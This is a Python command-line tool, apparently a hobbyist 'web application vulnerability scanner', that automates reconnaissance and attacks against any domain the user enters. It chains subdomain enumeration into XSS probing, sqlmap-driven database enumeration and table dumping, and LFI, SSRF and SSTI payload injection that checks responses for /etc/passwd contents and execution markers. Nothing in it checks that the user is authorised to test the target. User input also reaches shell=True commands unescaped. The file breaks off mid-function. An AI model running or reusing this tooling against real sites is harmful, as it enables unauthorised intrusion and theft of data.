# --------------------------------------------------------------------------------
# HELLO, & WELCOME TO 'QUANTUM-TECH' : WEB-APPLICATION-VULNERABILITY-SCANNER
# --------------------------------------------------------------------------------

# ---------- PYTHON (MODULES & LIBRARY) ----------
import os
import re
import sys
import time
import signal
import requests
import pyfiglet
import subprocess
import urllib.parse

# --------------------------------------------------------------------------------
# CLASS @ 'WEB-APPLICATION-VULNERABILITY-SCANNER (WAVS)'
# --------------------------------------------------------------------------------
class WAVS:
    # ---------- CLASS (VARIABLE) -----
    domain_name = None
    file_path = "Reports"

    # --------------------
    # RUN-COMMAND (FUNCTION) :
    # --------------------
    @staticmethod
    def run_command(command, outfile=None):
        print(f"\n[+] CURRENT-COMMAND : {command}")
        # ---------- CHECK, OUT-FILE ----------
        if outfile:
            with open(outfile, "w") as f:
                subprocess.run(command, shell=True, stdout=f, stderr=subprocess.STDOUT)
        
        else:
            subprocess.run(command, shell=True)

    # --------------------
    # INFORMATION-GATHER (FUNCTION) :
    # --------------------
    @staticmethod
    def information_gather():
        # ----- ACCESS (GLOBAL) VARIABLE -----
        global domain_name
        global file_path

        # HERE, WE WILL VALIDATE & SET (DOMAIN-NAME) AS ARE 'TARGET' :
        print(f"\n[+] CURRENT-TASK : PLEASE PROVIDE AN 'VALID' (DOMAIN-NAME) TO SET TARGET !")
        # HERE, WE HAVE TAKE (USER-PROVIDED) - DOMAIN-NAME AS 'TARGET' :
        domain_name = str(input(f"\n>>> ENTER-TARGET, (e.g : google.com) : "))

        try:
            if len(domain_name) == 0:
                print(f"\n***** PLEASE PROVIDE AN 'DOMAIN-NAME' ! *****")
                # RE-CALL (INFORMATION-GATHER) - FUNCTION :
                WAVS.information_gather()
            
            else:
                # DOMAIN-NAME (VALIDATION) :
                domain_name_pattern = re.compile(r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")
                # CHECK, (DOMAIN-NAME) MATCH'S WITH PATTERN :
                if not domain_name_pattern.match(domain_name):
                    print(f"\n***** INVALID ! 'DOMAIN-NAME' FORMATE ! *****")
                
                else:
                    print(f"\n>>> TARGET (DOMAIN-NAME) : {domain_name}")
                    # HERE, WE WILL SET (TARGET DOMAIN-NAME) AS REPORT/DIRECTORY-NAME :
                    file_path = f"Reports/{domain_name}"
                    # HERE, OS-COMMAND WILL HELP US TO MAKE 'REPORTS/DIRECTORY-NAME' :
                    os.makedirs(file_path, exist_ok=True)

                    # NOW, WE WILL RUN-COMMAND'S : SUBFINDER
                    print("\n[+] CURRENT-TASK : 'SUBFINDER (TOOL)', TO ENUMERATES (SUB-DOMAINS) !", end="\n")
                    # RUN-COMMAND (SUB-FINDER) :
                    time.sleep(3)
                    WAVS.run_command(f"subfinder -d {domain_name} -all -recursive -o {file_path}/sub-domain.txt")

                    # NOW, WE WILL RUN-COMMAND'S : HTTPX
                    print("\n[+] CURRENT-TASK : 'HTTPX (TOOL)', TO CHECK (SUB-DOMAINS) ARE LIVE !", end="\n")
                    # RUN-COMMAND (HTTPX) :
                    time.sleep(5)
                    WAVS.run_command(f"httpx -l {file_path}/sub-domain.txt -o {file_path}/live-sub-domain.txt")

                    # NOW, WE WILL RUN-COMMAND'S : KATANA
                    print("\n[+] CURRENT-TASK : 'KATANA (TOOL)', TO (CRAWL & FETCH) URL's OF (SUB-DOMAINS) !")
                    # RUN-COMMAND :
                    time.sleep(3)
                    WAVS.run_command(f"katana -list {file_path}/live-sub-domain.txt -o {file_path}/katana-urls.txt")

                    # NOW, WE WILL RUN-COMMAND'S : WAYBACKURLS
                    print("\n[+] CURRENT-TASK : 'WAYBACKURLS (TOOL)', TO FETCH URL's OF (SUB-DOMAIN) !")
                    # RUN-COMMAND :
                    # ---------- BANNER-NAME (QUANTUM-TECH) ---------- :
                    waybackurls_ascii_banner = pyfiglet.figlet_format(str("WAYBACKURLS").capitalize(), font="slant")
                    print(f"\n\033[97m {waybackurls_ascii_banner} \033[0m")
                    time.sleep(3)
                    WAVS.run_command(f"cat {file_path}/live-sub-domain.txt | waybackurls | tee {file_path}/waybackurls.txt")
                    print("\n")

                    # NOW, WE WILL RUN-COMMAND'S : ANEW
                    print("\n[+] CURRENT-TASK : 'ANEW (TOOL)', TO (MERGE) TWO-FILES & GENERATE ONE-NEW FILE !")
                    # RUN-COMMAND :
                    # ---------- BANNER-NAME (QUANTUM-TECH) ---------- :
                    anew_ascii_banner = pyfiglet.figlet_format(str("ANEW").capitalize(), font="slant")
                    print(f"\n\033[97m {anew_ascii_banner} \033[0m")
                    time.sleep(3)
                    WAVS.run_command(f"cat {file_path}/katana-urls.txt {file_path}/waybackurls.txt | anew {file_path}/final_urls.txt")
                    print("\n")

                    # ---------- VULNERABILITY-SCANNER (FUNCTION) ----------
                    WAVS.vulnerability_scanner(file_path, domain_name)
        
        except ValueError:
            sys.exit(f"\n***** OOPS ! SEEMS LIKE YOU DIDN'T PROVIDED 'VALID' (DOMAIN-NAME) *****")

    # --------------------
    # LOAD-PAYLOAD (FUNCTION) :
    # --------------------
    @staticmethod
    def load_payloads(payload_file_path):
        """
        /*
            LOAD PAYLOADS FILE (TXT)
        */
        """
        try:
            with open(payload_file_path, "r") as file:
                return [line.strip() for line in file if line.strip()]
        
        except FileNotFoundError:
            print(f"[-] CURRENT-TASK : 'FAILED' ! FILE : {payload_file_path} WAS NOT FOUND !")

    # --------------------
    # TEST-LFI (FUNCTION) :
    # --------------------
    @staticmethod
    def test_lfi(url, payloads, output_file):
        """
        /*
            TESTING 'LFI-VULNERABILITY' ON URL, WITH VARIOUS PAYLOADS
        */
        """
        extensions = [".jpg", ".jpeg", ".png", ".php", ".py", ".java", ".html", ".pdf", ".txt"]

        with open(output_file, "w") as out:
            print(f"\n[*] TESTING URL : {url}")

            for payload in payloads:
                try:
                    vulnerable = False  # track if any worked

                    # ----- CONDITION-ONE : IN BETWEEN (PATH) -----
                    for ext in extensions:
                        if ext in url:
                            # HERE, FIND LAST "/" BEFORE EXTENSION - STRIP FILENAME & .EXT
                            before_file = url[:url.rfind("/")]
                            after_param = url[url.rfind(ext) + len(ext):]  # keep any query tail (&size=160)

                            # INJECT PAYLOAD (CLEAN) :
                            inside_url = f"{before_file}/{payload}{after_param}"

                            try:
                                request_one = requests.get(inside_url, timeout=5)

                                if "root:x:" in request_one.text or "bin/bash" in request_one.text:
                                    print(f"\n[+] SUCCESS ! 'LFI' (FOUND) ON : {inside_url}")
                                    out.write(f"\n[VULNERABLE] : {inside_url}\n")
                                    vulnerable = True
                                else:
                                    print(f"\n[-] FAILED ! NOT-VULNERABLE : {inside_url}")

                            except Exception as e:
                                print(f"\n[!] ATTENTION ! ERROR WHILE TESTING PAYLOAD : {payload} ON CURRENT URL : {inside_url}, ERROR-MESSAGE : {e}")

                    # ----- CONDITION-TWO : DIRECT PARAMETER REPLACE -----
                    if "=" in url:
                        base, param = url.split("=", 1)
                        test_url = f"{base}={urllib.parse.quote(payload)}"

                        request_two = requests.get(test_url, timeout=5)

                        if "root:x:" in request_two.text or "bin/bash" in request_two.text:
                            print(f"\n[+] SUCCESS ! 'LFI' (FOUND) ON : {test_url}")
                            out.write(f"\n[VULNERABLE] : {test_url}\n")
                            vulnerable = True
                        else:
                            print(f"\n[-] FAILED ! NOT-VULNERABLE : {test_url}")

                    if not vulnerable:
                        print(f"\n[-] NO, 'LFI' FOUND WITH PAYLOAD : {payload}")

                    time.sleep(3)  # WAIT, FOR NEXT 3 SEC TO SEND REQUEST

                except Exception as e:
                    print(f"\n[!] ATTENTION ! ERROR WHILE TESTING PAYLOAD : {payload} ON CURRENT URL : {inside_url}, ERROR-MESSAGE : {e}")

    # --------------------
    # TEST-SSRF (FUNCTION) :
    # --------------------
    @staticmethod
    def test_ssrf(url, payloads, output_file):
        """
        /*
            TESTING 'SSRF-VULNERABILITY' ON URL, WITH VARIOUS PAYLOADS
        */
        """
        # SSRF (RESPONSE) - LIST :
        ssrf_response_list = ["root:x", "meta-data", "127.0.0.1", "127.1", "0177.0.0.1", "localhost", "0.0.0.0", "nameserver", "PRETTY_NAME", "Linux version"]

        with open(output_file, "w") as out:
            print(f"\n[*] TESTING-URL : {url}")

            for payload in payloads:
                try:
                    # REPLACE PARAMETER VALUE WITH PAYLOAD :
                    base, param = url.split("=", 1)
                    test_url = f"{base}={urllib.parse.quote(payload)}"

                    requ = requests.get(test_url, timeout=5)

                    # SSRF, ARE TESTED MANULLAY & NOT ALWAYS DON'T RETURN (PROOF), SO WE CHECK STATUS-CODE :
                    if any(marker in requ.text for marker in ssrf_response_list):
                        print(f"[+] SUCCES ! SSRF-VULNERABILITY FOUND AT : {test_url}")
                        out.write(f"[VULNERABLE] : {test_url}\n")

                    elif requ.status_code in [200, 302, 403]:
                        print(f"\n[#] CURRENT-URL : {test_url} & CURRENT-PAYLOAD : {payload}")
                        out.write(f"\n[SSRF-REQUEST] 'SSRF' - SENT REQUEST : {test_url}")

                    else:
                        print(f"\n[-] FAILED ! NO RESPONSE FROM URL : {test_url}")

                    time.sleep(3) # WAIT FOR, 3 SEC TO SEND NEXT REQUEST

                except Exception as e:
                    print(f"\n[!] ATTENTION ! ERROR WHILE TESTING URL : {test_url} WITH PAYLOAD : {payload}, ERROR-MESSAGE : {e}")

    # --------------------
    # TEST-SSTI (FUNCTION) :
    # --------------------
    @staticmethod
    def test_ssti(url, payloads, output_file):
        # SSTI (PROOF) - LIST : 
        markers = ["49", "7777777", "1337", "191", "root:x:", "uid=", "gid=", "bash"]  # PROOF-OF-EXECUTION

        with open(output_file, "w") as out:
            print(f"\n[*] TESTING SSTI on : {url}")

            for payload in payloads:
                try:
                    # INJECT-PAYLOAD :
                    base, param = url.split("=", 1)
                    test_url = f"{base}={urllib.parse.quote(payload)}"

                    r = requests.get(test_url, timeout=7)

                    # CHECK, ANY SSTI (FOUND) :
                    if any(marker in r.text for marker in markers):
                        print(f"\n[+] SUCCESS! SSTI-VULNERABILITY (FOUND) ON : {test_url}")
                        print(f"\n[*] PAYLOAD USED : {payload}")
                        out.write(f"\n[VULNERABLE] : {test_url} WITH Payload: {payload}")
                    else:
                        print(f"\n[-] FAILED ! NOT VULNERABLE : {test_url}")

                    time.sleep(3)  # WAIT FOR 3-SEC, TO SEND NEXT REQUEST

                except Exception as e:
                    print(f"\n[!] ERROR ! WHILE TESTING THE 'PAY-LOAD' : {payload} ON CURRENT-URL : {url}, ERROR-MESSAGE : {e}")

    # --------------------
    # VULNERABILITY-SCANNER (FUNCTION) :
    # --------------------
    @staticmethod
    def vulnerability_scanner(target_file_path, target_domain_name):
        # TARGET (DOMAIN-NAME) : FILE-PATH & DOMAIN-NAME :
        file_path = target_file_path
        target_name = target_domain_name

        # ---------- 'VULNERABILITY-SCANNER' (MENU) ----------
        while True:
            # ---------- BANNER-NAME (VULNERABILITY-SCANNER) ---------- :
            ascii_banner = pyfiglet.figlet_format("VULNERABILITY-SCANNER", font="slant")
            print(f"\n\033[97m {ascii_banner} \033[0m")

            # ----- VULNERABILITY-SCANNER (MENU) ----- :
            print(f"\n***** WELCOME TO, 'VULNERABILITY-SCANNER' (MENU) *****", end="\n\n")
            print(f">>> PRESS (1) : XSS (CROSS-SITE-SCRIPTING)")
            print(f">>> PRESS (2) : SQL-i (SQL-INJECTION)")
            print(f">>> PRESS (3) : LFI (LOCAL-FILE-INCLUSION)")
            print(f">>> PRESS (4) : SSRF (SERVER-SIDE-REQUEST-FORGERY)")
            print(f">>> PRESS (5) : SSTI (SERVER-SIDE-TEMPLET-INJECTION)")
            print(f">>> PRESS (0) : EXIT, VULNERABILITY-SCANNER")

            # USER-CHOICE (FOR, VULNERABILITY-SCANNER) :
            user_choice = str(input(f"\n>>> ENTER, YOUR CHOICE : "))

            # MAIN-EXECUTION :
            try:
                # CHECK, USER-CHOICE :
                if len(user_choice) == 0:
                    print(f"\n***** OH ! LOOK'S LIKE YOU DIDN'T CHOOSE ANY 'VULNERABILITY' TO SCAN ! *****")
                    sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")
                else:
                    # NOW, CONVERT VARIABLE (TYPE) FROM STRING TO INTEGER :
                    int_choice = int(user_choice)

                    # ----- XSS ----- :
                    if int_choice == 1:
                        # XSS (CROSS-SITE-SCRIPTING) - VULNERABILITY :
                        print(f"\n[+] CURRENT-TASK : SCANNING FOR 'XSS' VULNERABILITY !")
                        # WARNING-MESSAGE :
                        print(f"\n[!] WARNING : CURRENT-TASK (XSS-VULNERABILITY-SCAN), WILL TAKE SEVERAL '(MINUTES OR HOURS)', BASED ON (SUB-DOMAINS OR WEBSITE) ...")
                        user_option = str(input(f"\n>>> DO YOU WANT TO CONTINYE : [Y]ES OR [N]O : "))

                        # CHECK, USER-OPTION :
                        if user_option in ["YES", "Y", "Yes", "yes", "y"] or len(user_option) == 0:
                            # ----- 'GF-TOOL' (XSS-PATTERN) - PARAMTERS -----
                            print(f"\n[+] CURRENT-TASK : USING 'GF-TOOL', TO (FIND) XSS (VULNERABLE-PARAMTERS) !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/final_urls.txt | gf xss | tee {file_path}/xss_vuln_urls.txt")

                            # ---------- BANNER-NAME (XSS) ---------- :
                            ascii_banner = pyfiglet.figlet_format("XSS (CROSS-SITE-SCRIPTING)", font="slant")
                            print(f"\n\033[97m {ascii_banner} \033[0m")
                            print("\n")

                            # ----- 'GXSS & KXSS (TOOL)' -----
                            print(f"\n[+] CURRENT-TASK : USING 'GXSS & KXSS' (TOOL) TO (FIND) 'XSS-VULNERABILITY' !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/xss_vuln_urls.txt | Gxss -c 500 -p '><u>NEON-WHITE</u>' | kxss | tee {file_path}/xss_vulnerability.txt")

                            # ----- NOW, HERE WE WILL 'CHECK' FILE : XSS_VULNERABILITY ----- :
                            try:
                                if os.path.exists(f"{file_path}/xss_vulnerability.txt"):
                                    with open(f"{file_path}/xss_vulnerability.txt", "r") as file:
                                        file_data = file.read().strip()

                                    if len(file_data) == 0:
                                        print(f"\n[!] ATTENTION ! FILE : {file_path}/xss_vulnerability.txt, DIDN'T FOUND ANY 'XSS (VULNERABLE)' - URL'S !")
                                        WAVS.vulnerability_scanner(file_path, target_name)
                                    
                                    else:
                                        print(f"\n[+] CURRENT-TASK : NOW, WE HAVE FOUND 'FEW' (XSS-VULNERABLE) - URL'S. SO, YOU CAN MANUALLY PROCEED WITH VARIOUS 'XSS-PAYLOADS' !")
                                        condition = str(input(f"\n>>> SO, DO YOU WANT TO SEE 'XSS-PAYLOAD' & TRY ON 'XSS-VULNERABLE' URL'S WITH PAYLOADS : [Y]ES OR [N]O : "))

                                        try:
                                            if condition in ["YES", "Yes", "Y", "y", "yes"] or len(condition) == 0:
                                                # HERE, WE WILL LOAD (XSS) - PAYLOADS :
                                                if os.path.exists(f"Payloads/XSS_Payloads.txt"):
                                                    print(f"\n[+] CURRENT-TASK : DISPLAY, 'XSS-PAYLOAD' (FILE) ...")
                                                    # RUN-COMMAND :
                                                    WAVS.run_command(f"cat Payloads/XSS_Payloads.txt")
                                                    # MESSAGE :
                                                    print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! WE HAVE PERFORM 'XSS-VULNERABILITY-SCAN' ON TARGET : {target_name}. ")

                                                else:
                                                    print(f"\n[-] CURRENT-TASK : 'FAILED' ! NO SUCH FILE : 'Payloads/XSS_Payloads.txt' EXISTS, PLEASE TRY AGAIN !")

                                            elif condition in ["NO", "No", "N", "n", "no"]:
                                                print(f"\n[!] WARNING ! YOU CHOOSE NOT TO CONTINUE, TRY NEW 'VULNERABILITY' !")
                                                # ------ RE-CALL (VULNERABILITY-SCANNER) - FUNCTION ----- :
                                                WAVS.vulnerability_scanner(file_path, target_name)

                                        except ValueError:
                                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                                else:
                                    print(f"\n[-] CURRENT-TASK : 'FAILED' ! FILE NOT FOUND '{file_path}/xss_vulnerability.txt' !, TRY AGAIN !")
                                    # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION ----- :
                                    WAVS.vulnerability_scanner(file_path, target_name)

                            except FileNotFoundError:
                                sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                        elif user_option in ["NO", "N", "No", "no", "n"]:
                            # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION -----
                            WAVS.vulnerability_scanner(file_path, target_name)

                        else:
                            # EXIT, VULNERABILITY-SCANNER :
                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                    # ----- SQL-i ----- :
                    elif int_choice == 2:
                        # SQLi (SQL-INJECTION) - VULNERABILITY :
                        print(f"\n[+] CURRENT-TASK : SCANNING FOR 'SQL-i' VULNERABILITY !")
                        # WARNING-MESSAGE :
                        print(f"\n[!] WARNING : CURRENT-TASK (SQLi-VULNERABILITY-SCAN), WILL TAKE SEVERAL '(MINUTES OR HOURS)', BASED ON (SUB-DOMAINS OR WEBSITE) ...")
                        user_option = str(input(f"\n>>> DO YOU WANT TO CONTINYE : [Y]ES OR [N]O : "))

                        # CHECK, USER-OPTION :
                        if user_option in ["YES", "Y", "Yes", "yes", "y"] or len(user_option) == 0:
                            # ----- 'GF-TOOL' (SQLi-PATTERN) - PARAMTERS -----
                            print(f"\n[+] CURRENT-TASK : USING 'GF-TOOL', TO (FIND) 'SQL-INJECTION' (VULNERABLE-PARAMTERS) !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/final_urls.txt | gf sqli | tee {file_path}/sqli_vuln_urls.txt")

                            # ---------- BANNER-NAME (SQL-i) ---------- :
                            ascii_banner = pyfiglet.figlet_format("SQL-i (SQL-INJECTION)", font="slant")
                            print(f"\n\033[97m {ascii_banner} \033[0m")
                            print("\n")

                            # ----- REMOVE, (NOISE & DUPLICATION) FROM FILE : SQLI_VULN_URLS -----
                            print(f"\n[+] CURRENT-TASK : USING 'AWK' (TOOL), TO REMOVE DUPLICATION ...")
                            WAVS.run_command(f"awk -F'[?=&]' '!seen[$2]++' {file_path}/sqli_vuln_urls.txt | tee {file_path}/sqli_clean_vuln_urls.txt")

                            # LOOP-CONDITION :
                            loop_condition = True
                            # ----- SQL-MAP (TOOL) -----
                            while loop_condition:
                                print(f"\n[+] CURRENT-TASK : DISPLAY, LIST OF 'SQL-i VULNERABLILITY' URL's !")
                                # RUN-COMMAND :
                                WAVS.run_command(f"cat {file_path}/sqli_clean_vuln_urls.txt")
                                print(f"\n[!] ATTENTION ! PLEASE PROVIDE AN (SQL-i) - VULNERABLE URL'S FROM FILE : {file_path}/sqli_clean_vuln_urls.txt | JUST COPY & PASTE THE URL ...")

                                # ASK, USER TO PROVIDE AN 'VULNERABLE-URL' :
                                vulnerable_url = str(input(f"\n>>> ENTER, 'VULNERABLE-URL' FROM THE ABOVE LIST : ")).strip()

                                # CHECK, URL :
                                try:
                                    regex = re.compile(
                                        r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?'  # SCHEMA
                                        r'([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'  # DOMAIN
                                        r'(:[0-9]{1,5})?(\/.*)?$'  # OPTIONAL (PORT & PATH)
                                    )

                                    if len(vulnerable_url) == 0:
                                        print(f"\n[-] CURRENT-TASK : 'FAILED' ! PLEASE PROVIDE AN 'URL' !")

                                    elif re.match(regex, vulnerable_url):
                                        # ----- SQL-MAP (COMMANDS) -----

                                        # STEP-ONE : SCAN 'SQL-i VULNERABLE URL'
                                        print(f"\n[+] STEP-ONE : RUNNING, SQL-MAP (TOOL) ON FOLLOWING URL : {vulnerable_url} !")
                                        WAVS.run_command(f"sqlmap -u {vulnerable_url} --batch --level 3 --risk 3")

                                        # STEP-TWO (FETCH : SQL-DATABASE) :
                                        print(f"\n[+] STEP-TWO : SQL-MAP (TOOL), TO LIST 'DATABASE' !")
                                        WAVS.run_command(f"sqlmap -u {vulnerable_url} --batch --dbs")

                                        # ASK, USER FOR 'DATABAE-NAME' ;
                                        database_name = str(input(f"\n>>> ENTER, 'DATABASE-NAME' YOU FOUND FROM (SQL-MAP) TOOL : ")).strip()

                                        # CHECK, 'DATBASE-NAME' :
                                        if len(database_name) == 0:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! YOU DIDN'T PROVIDE A DATABASE NAME !")
                                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                                        else:
                                            # STEP-THREE (FETCH : TABLES FROM DATABASE) :
                                            print(f"\n[+] STEP-THREE : SQL-MAP (TOOL), TO LIST 'TABLES' FROM DATABASE : {database_name}")
                                            WAVS.run_command(f"sqlmap -u {vulnerable_url} --batch -D {database_name} --tables")

                                        # ASK, USER FOR 'TABLE-NAME' :
                                        table_name = str(input(f"\n>>> ENTER, 'TABLE-NAME' YOU FOUND FROM ABOVE LIST : ")).strip()

                                        # CHECK, 'TABLE-NAME' :
                                        if len(table_name) == 0:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! YOU DIDN'T PROVIDE A TABLE NAME !")
                                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                                        else:
                                            # STEP-FOUR (FETCH : COLUMSN FROM TABLE OF DATABASE) :
                                            print(f"\n[+] STEP-FOUR : SQL-MAP (TOOL), TO LIST 'COLUMNS' FROM TABLE : {table_name}")
                                            WAVS.run_command(f"sqlmap -u {vulnerable_url} --batch -D {database_name} -T {table_name} --columns")

                                        # STEP-FIVE (DUMP-DATABASE) :
                                        print(f"\n[!] ATTENTION : NOW, DO YOU WANT TO 'DUMP' AN COMPLETE DATABASE OF : {database_name.upper()} !")
                                        choice = str(input(f"\n>>> DO, YOU WANT TO DUMP : [Y]ES OR [N]O : ")).strip()

                                        try:
                                            if choice in ["YES", "yes", "Yes", "Y", "y"] or len(choice) == 0:
                                                print(f"\n[+] STEP-FIVE : SQL-MAP (TOOL), TO (DUMP) AN ENTIRE-DATABASE : {database_name.upper()} ...")
                                                # RUN-COMMAND :
                                                WAVS.run_command(f"sqlmap -u {vulnerable_url} --batch -D {database_name} -T {table_name} --dump")

                                                # MESSAGE :
                                                print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SQL-INJECTION (VULNERABLILITY-SCAN) WAS COMPLETED !")

                                            elif choice in ["NO", "No", "no", "N", "n"]:
                                                # MESSAGE :
                                                print(f"\n[!] WARNING ! AL-RIGHT IT'S LOOKS LIKE YOU DO WANT TO (DUMP) AN ENTIRE-DATABASE ...")
                                                print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SQL-INJECTION (VULNERABLILITY-SCAN) WAS COMPLETED !")

                                            else:
                                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! OOPS LOOKE LIKE WRONG OPTION, TRY AGAIN !")

                                            # ----- EXIT, SQL-i ----- :
                                            print(f"\n[?] SO, NOW DO YOU WANT TO TEST ANOTHER (URL) FOR SQL-i ?")
                                            choose = str(input(f"\n>>> SO, WHAT'S YOUR CHOICE [Y]ES OR [N]O : "))

                                            if len(choose) == 0:
                                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! LOOK'S LIKE YOU DIDN'T CHOOSE ANY OPTION ...")
                                                continue

                                            elif choose in ["YES", "yes", "Yes", "Y", "y"]:
                                                continue

                                            elif choose in ["NO", "No", "no", "N", "n"]:
                                                print(f"\n[+] CURRENT-TASK : LOOK'S LIKE YOU WANT TO EXIT (SQL-INJECTION), VISIT AGAIN !")
                                                print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SQL-INJECTION (VULNERABLILITY-SCAN) WAS COMPLETED !")
                                                loop_condition = False

                                            else:
                                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! LOOK'S LIKE YOU CHOOSE WRONG OPTION, TRY AGAIN !")
                                                loop_condition = False

                                        except ValueError:
                                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                                    else:
                                        print(f"\n[-] CURRENT-TASK : 'FAILED' ! IN-VALID URL, TRY AGAIN !")
                                        loop_condition = False

                                except ValueError:
                                    sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                        elif user_option in ["NO", "N", "No", "no", "n"]:
                            # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION -----
                            WAVS.vulnerability_scanner(file_path, target_name)

                        else:
                            # EXIT, VULNERABILITY-SCANNER :
                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                    # ----- LFI ----- :
                    elif int_choice == 3:
                        # LFI (LOCAL-FILE-INCLUSION) - VULNERABILITY :
                        print(f"\n[+] CURRENT-TASK : SCANNING FOR 'LFI' VULNERABILITY !")
                        # WARNING-MESSAGE :
                        print(f"\n[!] WARNING : CURRENT-TASK (LFI-VULNERABILITY-SCAN), WILL TAKE SEVERAL '(MINUTES OR HOURS)', BASED ON (SUB-DOMAINS OR WEBSITE) ...")
                        user_option = str(input(f"\n>>> DO YOU WANT TO CONTINYE : [Y]ES OR [N]O : "))

                        # CHECK, USER-OPTION :
                        if user_option in ["YES", "Y", "Yes", "yes", "y"] or len(user_option) == 0:
                            # ----- 'GF-TOOL' (LFI-PATTERN) - PARAMTERS -----
                            print(f"\n[+] CURRENT-TASK : USING 'GF-TOOL', TO (FIND) 'LFI' (VULNERABLE-PARAMTERS) !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/final_urls.txt | gf lfi | tee {file_path}/lfi_vuln_urls.txt")

                            # ---------- BANNER-NAME (LFI) ---------- :
                            ascii_banner = pyfiglet.figlet_format("LFI (LOCAL-FILE-INCLUSION)", font="slant")
                            print(f"\n\033[97m {ascii_banner} \033[0m")
                            print("\n")

                            # ----- REMOVE, (NOISE & DUPLICATION) FROM FILE : LFI_VULN_URLS -----
                            print(f"\n[+] CURRENT-TASK : USING 'AWK' (TOOL), TO REMOVE DUPLICATION ...")
                            WAVS.run_command(f"awk -F'?' '!seen[$1]++' {file_path}/lfi_vuln_urls.txt | tee {file_path}/lfi_clean_vuln_urls.txt")

                            # ----- LOAD-PAYLOADS (LFI) ----- :
                            print(f"\n[+] CURRENT-TASK : LOADING... 'LFI' (PAYLOADS) !")
                            lfi_payloads = WAVS.load_payloads(f"Payloads/LFI_Payloads_Test.txt")
                            # CHECK, PAYLOAD FILE :
                            if not lfi_payloads:
                                print(f"\n[!] ATTENTION : FILE [LFI-PAYLOADS.TXT] SEEMS TO BE 'EMPTY' !")

                            else:
                                # LOOP-CONDITION (VARIBALE) :
                                loop_condition = True
                                # ----- TEST-LFI (VULNERABILITY) ----- :
                                while loop_condition:
                                    print(f"\n[+] CURRENT-TASK : DISPLAY, LIST OF 'LFI VULNERABLILITY' URL's !")
                                    # RUN-COMMAND :
                                    WAVS.run_command(f"cat {file_path}/lfi_clean_vuln_urls.txt")
                                    print(f"\n[!] ATTENTION ! PLEASE PROVIDE AN (LFI) - VULNERABLE URL'S FROM FILE : {file_path}/lfi_clean_vuln_urls.txt | JUST COPY & PASTE THE URL ...")

                                    # ASK, USER TO PROVIDE AN 'VULNERABLE-URL' :
                                    vulnerable_url = str(input(f"\n>>> ENTER, 'VULNERABLE-URL' FROM THE ABOVE LIST : ")).strip()

                                    # CHECK, URL :
                                    try:
                                        regex = re.compile(
                                            r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?'  # SCHEMA
                                            r'([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'  # DOMAIN
                                            r'(:[0-9]{1,5})?(\/.*)?$'  # OPTIONAL (PORT & PATH)
                                        )

                                        if len(vulnerable_url) == 0:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! PLEASE PROVIDE AN 'URL' !")

                                        elif re.match(regex, vulnerable_url):
                                            # RUN-COMMAND :
                                            WAVS.run_command(f"touch {file_path}/lfi_vulnerability_output.txt")
                                            print(f"\n[+] CURRENT-TASK : TESTING 'LFI-VULNERABILITY' ON CURRENT-URL : {vulnerable_url} ...")
                                            # ----- TEST 'LFI' (FUNCTION) ----- :
                                            WAVS.test_lfi(vulnerable_url, lfi_payloads, f"{file_path}/lfi_vulnerability_output.txt")

                                            # ----- LFI-VULNERABILITY (FILE) - OUTPUT -----
                                            print(f"\n[+] CURRENT-TASK : DISPLAY, FILE : {file_path}/lfi_vulnerability_output.txt ! TO CHECK-OUT VULNERABLE URL'S ...")
                                            # CHECK, FILE :
                                            with open(f"{file_path}/lfi_vulnerability_output.txt", 'r') as file:
                                                file_data = file.read().strip()

                                            if len(file_data) == 0:
                                                print(f"\n[!] CURRENT-TASK : 'FAILED' ! NO, LFI-VULNERABLE (URL'S) FOUND TRY WITH ANOTHER URL ...")

                                            else:
                                                # RUN-COMMAND :
                                                WAVS.run_command(f"cat {file_path}/lfi_vulnerability_output.txt")

                                            # ----- TEST, ANOTHER (URL) -----
                                            print(f"\n[*] SO, DO YOU WANT TO TEST ANOTHER (URL) FOR 'LFI-VULNERABILITY' ?")
                                            choice = str(input(f"\n>>> SO, WHAT YOUR CHOICE : [Y]ES OR [N]O : ")).strip()

                                            try:
                                                if choice in ["YES", "Yes", "yes", "Y", "y"]:
                                                    continue

                                                else:
                                                    # MESSAGE :
                                                    print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! LFI (VULNERABLILITY-SCAN) WAS COMPLETED !")
                                                    # EXIT :
                                                    loop_condition = False

                                            except ValueError:
                                                print(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")
                                                loop_condition = False

                                        else:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! IN-VALID URL, TRY AGAIN !")
                                            loop_condition = False

                                    except ValueError:
